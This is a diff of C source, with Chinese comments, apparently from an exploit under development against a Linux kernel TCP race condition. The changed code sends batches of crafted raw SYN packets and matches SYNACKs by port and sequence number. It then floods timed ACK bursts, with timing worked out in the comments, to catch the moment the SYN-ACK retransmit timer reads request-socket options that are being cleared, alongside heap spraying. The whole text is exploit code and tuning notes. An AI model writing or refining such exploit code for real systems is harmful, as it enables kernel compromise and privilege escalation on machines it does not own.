@@ -1464,22 +1464,54 @@ struct race_slot {
 };
 
 static int race_batch(struct race_slot *slots, int want, struct synack *out) {
-    int n = 0;
+    /* 先把 20 个 SYN 一口气全发出去，再统一收 SYNACK。
+     *
+     * 这一点很关键：原来是用 syn_round 逐个发、逐个等，而 syn_round
+     * 内部最多等 60ms。20 个四元组串下来，第一个和最后一个的 SYN 到达
+     * 时间可能差上百毫秒，它们的 SYNACK 重传定时器也就差了同样多。
+     * 后面统一 usleep(960ms) 时，早的那批定时器早到期了、晚的还没到期，
+     * 时序完全错乱 —— 这也是 clear 一直是 0、怎么都撞不上的原因之一。
+     *
+     * 现在先全部发出去，让 20 个定时器几乎同时启动，到期点也就对齐了。 */
+    uint16_t sports[RACE_BATCH];
+    uint32_t isns[RACE_BATCH];
+    uint8_t syns[RACE_BATCH][128];
+    size_t syn_len[RACE_BATCH];
+
     for (int i = 0; i < want; i++) {
-        uint16_t sport;
-        uint32_t isn;
+        sports[i] = (uint16_t)(20000 + (rand() % 40000));
+        isns[i] = ((uint32_t)rand() << 16) ^ (uint32_t)rand();
+        syn_len[i] = build_pkt(syns[i], sports[i], isns[i], 0, 0x02);
+    }
+    for (int i = 0; i < want; i++) tx(syns[i], syn_len[i]);
+
+    /* 统一收 SYNACK，最多等 200ms。 */
+    struct timespec t0;
+    clock_gettime(CLOCK_MONOTONIC, &t0);
+    int n = 0;
+    for (;;) {
+        struct timespec now;
+        clock_gettime(CLOCK_MONOTONIC, &now);
+        long ms = (now.tv_sec - t0.tv_sec) * 1000 + (now.tv_nsec - t0.tv_nsec) / 1000000;
+        if (ms > 200) break;
+
+        pthread_mutex_lock(&g_ring_lock);
         struct synack s;
-        if (!syn_round(&sport, &isn, &s)) continue;
+        int got = pop(&s);
+        pthread_mutex_unlock(&g_ring_lock);
+        if (!got) { usleep(200); continue; }
+
+        /* 找到这个回包对应的四元组。 */
+        int idx = -1;
+        for (int i = 0; i < want; i++) {
+            if (sports[i] == s.peer && isns[i] + 1 == s.ack) { idx = i; break; }
+        }
+        if (idx < 0) continue;
+
         g_synack++;
         if (s.optlen == 0) {
             g_clear++;
             g_clear_first++;
-            /* optlen=0 有两种来源，必须分开：
-             *   · 首次 SYNACK 就为 0 —— 说明请求 sock 建起来时 ireq_opt
-             *     已经是空的，和竞态无关（多半是喷淋的 socket 把端口占了，
-             *     或者这个 SYN 根本没走到 tcp_v4_save_options）；
-             *   · 竞态期间被清空 —— 那才是撞上了。
-             * 打印前几条，看是不是集中在某一批。 */
             if (g_clear <= 6) {
                 say("[clear] 首次 SYNACK 就没有选项：peer=%u ack=%#x gen=%u",
                     s.peer, s.ack, g_spray_gen);
@@ -1491,8 +1523,8 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
             *out = s;
             return 1;
         }
-        slots[n].sport = sport;
-        slots[n].isn = isn;
+        slots[n].sport = sports[idx];
+        slots[n].isn = isns[idx];
         slots[n].peer_seq = s.seq;
         n++;
     }
@@ -1500,13 +1532,21 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
      * 把「通道不通」和「通道通了但没撞上」分开，否则日志会误导。 */
     if (n == 0) return -1;
 
-    /* 等重传定时器就位。SYN 重传用 TCP_TIMEOUT_INIT，约 1 秒。
+    /* 时序安排：让 ACK 覆盖住「重传定时器到期」的那一小段时间。
      *
-     * 起点定在 960ms 而不是 880ms：TCP_TIMEOUT_INIT 在 6.6 上是
-     * TCP_TIMEOUT_INIT = 1s（HZ 无关），加上请求 sock 入队到定时器
-     * 真正挂上还有一点延迟，实际到期点通常在 1s 之后一点点。
-     * 从 960ms 起扫能把整个到期点包住，又不至于太早空转。 */
-    usleep(960 * 1000);
+     * 两个约束互相拉扯：
+     *   · ACK 太早 —— tcp_v4_syn_recv_sock 先把 req 摘走、ireq_opt 置空、
+     *     定时器被取消，重传根本不发生，我们等不到那一刻；
+     *   · ACK 太晚 —— 定时器已经跑完，ireq_opt 读都读过了，撞不上。
+     *
+     * 所以不能精确地等某一个点，只能从「定时器刚开始可能到期」一直
+     * 打到「肯定已经到期」，用密集的 ACK 把这段窗口整个盖住。
+     *
+     * TCP_TIMEOUT_INIT = 1s，从 req 入队算起。tcp_conn_request 入队到
+     * 定时器真正挂上还有几十毫秒的抖动，加上多核调度，实际到期点大致
+     * 落在 950ms~1150ms 之间。于是从 950ms 开始，每 1ms 把整批 ACK
+     * 连打 8 遍，持续到 1250ms。 */
+    usleep(950 * 1000);
 
     /* 预先构造好每个四元组的 ACK 包，循环里只做 sendto，省掉打包开销。 */
     uint8_t acks[RACE_BATCH][128];
@@ -1527,11 +1567,23 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
      * 是个瞬间，稀稀拉拉地打，绝大多数 ACK 都落在窗口外。内层连打能让
      * 「ACK 恰好落在定时器读内存的那一刻」的概率提高近一个数量级，
      * 而代价只是多几次 sendto。 */
-    for (int round = 0; round < 400; round++) {
+    unsigned long rx_before = g_rx;
+    for (int round = 0; round < 300; round++) {
         for (int k = 0; k < 8; k++) {
             for (int i = 0; i < n; i++) tx(acks[i], ack_len[i]);
         }
         usleep(1000);
+    }
+    unsigned long rx_during = g_rx - rx_before;
+
+    /* 这段时间收到的包数就是「定时器有没有重传」的硬指标。
+     * 每个四元组若重传一次，我们就会多收到一个 SYNACK；n 个四元组
+     * 全都没重传的话，这个数应该接近 0。 */
+    if (rx_during > 0) {
+        say("[race] ACK 扫描期间收到 %lu 个包（%d 个四元组，平均 %.1f/个）",
+            rx_during, n, (double)rx_during / (n > 0 ? n : 1));
+    } else {
+        say("[race] ACK 扫描期间一个包都没收到 —— 重传定时器没有触发");
     }
 
     /* 收这一批的回包，只认本批的四元组。
